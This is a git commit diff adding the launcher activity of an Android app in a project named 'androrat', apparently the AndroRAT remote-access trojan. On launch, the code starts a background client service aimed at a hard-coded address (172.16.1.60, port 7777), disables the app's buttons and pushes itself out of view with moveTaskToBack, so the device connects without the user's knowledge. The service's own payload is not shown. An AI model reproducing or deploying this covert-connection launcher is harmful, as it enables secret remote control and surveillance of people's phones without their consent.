abd7fde1f74f927cbecead6a8dc2012a1eb3b76b
clmd <clmd520mm@gmail.com>
2014-08-03 09:16:02 +0800

    initial commit

---
+++ androrat/src/Androrat/src/my/app/client/LauncherActivity.java
@@ -0,0 +1,68 @@
+package my.app.client;
+
+import my.app.client.R;
+import Packet.PreferencePacket;
+import android.app.Activity;
+import android.content.Intent;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+
+public class LauncherActivity extends Activity {
+    /** Called when the activity is first created. */
+	
+	Intent Client, ClientAlt;
+	Button btnStart, btnStop;
+	EditText ipfield, portfield;
+    @Override
+    public void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.main);
+        
+        Client = new Intent(this, Client.class);
+        Client.setAction(LauncherActivity.class.getName());
+        
+        btnStart = (Button) findViewById(R.id.buttonstart);
+        btnStop = (Button) findViewById(R.id.buttonstop);
+       // ipfield = (EditText) findViewById(R.id.ipfield);
+       // portfield = (EditText) findViewById(R.id.portfield);
+        
+        btnStart.setOnClickListener(new View.OnClickListener() {
+            public void onClick(View view) {
+            	Client.putExtra("IP", ipfield.getText().toString());
+            	Client.putExtra("PORT", new Integer(portfield.getText().toString()));
+                startService(Client);
+                btnStart.setEnabled(false);
+                btnStop.setEnabled(true);
+             
+                
+                //finish();                
+            }
+        });
+        
+		
+		Client.putExtra("IP","172.16.1.60");
+		Client.putExtra("PORT",7777);
+      //  Client.putExtra("IP", ipfield.getText().toString());
+    //	Client.putExtra("PORT", new Integer(portfield.getText().toString()));
+        startService(Client);
+        btnStart.setEnabled(false);
+        btnStop.setEnabled(false);
+        moveTaskToBack(true);
+        System.out.println("启动服务");
+
+
+
+
+        
+        btnStop.setOnClickListener(new View.OnClickListener() {
+            public void onClick(View view) {             
+                stopService(Client);  
+                btnStart.setEnabled(true);
+                btnStop.setEnabled(false);
+                //finish(); 
+            }
+        });
+    }
+}
